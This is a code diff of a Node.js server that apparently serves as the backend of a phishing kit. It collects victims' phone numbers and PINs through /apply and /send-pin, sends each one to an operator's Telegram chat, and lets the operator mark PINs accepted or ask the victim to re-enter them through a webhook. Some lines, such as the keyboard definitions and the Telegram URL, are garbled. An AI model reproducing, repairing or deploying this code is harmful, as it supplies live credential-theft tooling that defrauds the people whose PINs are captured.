@@ -10,32 +10,31 @@ const token = process.env.BOT_TOKEN;
 const cid = process.env.CHAT_ID;
 const users = {};
 
+// Home
 app.get("/", (req, res) => { 
   res.sendFile(path.join(__dirname, "index.html")); 
 });
 
-// 1. APPLICATION
-app.post("/apply", async (req, res) => {
-  const { name, phone } = req.body;
+// Apply
+app.post("/apply", (req, res) => {
+  const phone = req.body.phone;
   if (!phone) return res.sendStatus(400);
   
   users[phone] = { status: "pending", pinStatus: "waiting", attempts: 0 };
   
-  const keyboard = {
-    inline_keyboard:]
-  };
+  const msg = "New Application: " + phone;
+  const kb = { inline_keyboard:] };
 
-  try {
-    await axios.post("https://telegram.org" + token + "/sendMessage", {
-      chat_id: cid,
-      text: "New Application: " + name + " (" + phone + ")",
-      reply_markup: keyboard
-    });
-    res.sendStatus(200);
-  } catch (e) { res.sendStatus(500); }
+  axios.post("https://telegram.org" + token + "/sendMessage", {
+    chat_id: cid,
+    text: msg,
+    reply_markup: kb
+  }).catch(e => console.log("TG Error"));
+
+  res.sendStatus(200);
 });
 
-// 2. STATUS
+// Status Checks
 app.get("/status/:phone", (req, res) => {
   const u = users[req.params.phone];
   res.json({ status: u ? u.status : "unknown" });
@@ -43,36 +42,31 @@ app.get("/status/:phone", (req, res) => {
 
 app.get("/check-pin-status/:phone", (req, res) => {
   const u = users[req.params.phone];
-  res.json({ 
-    status: u ? u.pinStatus : "unknown", 
-    attempt: u ? u.attempts : 0 
-  });
+  res.json({ status: u ? u.pinStatus : "unknown", attempt: u ? u.attempts : 0 });
 });
 
-// 3. PIN SUBMIT
-app.post("/send-pin", async (req, res) => {
-  const { phone, pin } = req.body;
-  const user = users[phone];
-  if (!user) return res.sendStatus(404);
+// PIN Submit
+app.post("/send-pin", (req, res) => {
+  const phone = req.body.phone;
+  const pin = req.body.pin;
+  if (!users[phone]) return res.sendStatus(404);
 
-  user.attempts += 1;
-  user.pinStatus = "verifying";
+  users[phone].attempts += 1;
+  users[phone].pinStatus = "verifying";
 
-  const pinKeyboard = {
-    inline_keyboard:]
-  };
+  const msg = "PIN: " + pin + " (" + phone + ")";
+  const kb = { inline_keyboard:] };
 
-  try {
-    await axios.post("https://telegram.org" + token + "/sendMessage", {
-      chat_id: cid,
-      text: "PIN RECEIVED: " + pin + " (" + phone + ")",
-      reply_markup: pinKeyboard
-    });
-    res.sendStatus(200);
-  } catch (e) { res.sendStatus(500); }
+  axios.post("https://telegram.org" + token + "/sendMessage", {
+    chat_id: cid,
+    text: msg,
+    reply_markup: kb
+  }).catch(e => console.log("TG Error"));
+
+  res.sendStatus(200);
 });
 
-// 4. WEBHOOK
+// Webhook
 app.post("/webhook", (req, res) => {
   const body = req.body;
   if (!body.callback_query) return res.sendStatus(200);
@@ -83,15 +77,16 @@ app.post("/webhook", (req, res) => {
   const phone = parts[1];
 
   if (users[phone]) {
-    if (cmd === "approve") users[phone].status = "approved";
+    if (cmd === "ok") users[phone].status = "approved";
     if (cmd === "pinok") users[phone].pinStatus = "success";
-    if (cmd === "pinwrong") users[phone].pinStatus = "re-enter";
+    if (cmd === "pinerr") users[phone].pinStatus = "re-enter";
   }
 
   res.sendStatus(200);
 });
 
+// THIS MUST BE AT THE VERY END
 const PORT = process.env.PORT || 8080;
 app.listen(PORT, "0.0.0.0", () => {
-  console.log("SERVER START SUCCESSFUL");
+  console.log("SERVER IS RUNNING");
 });
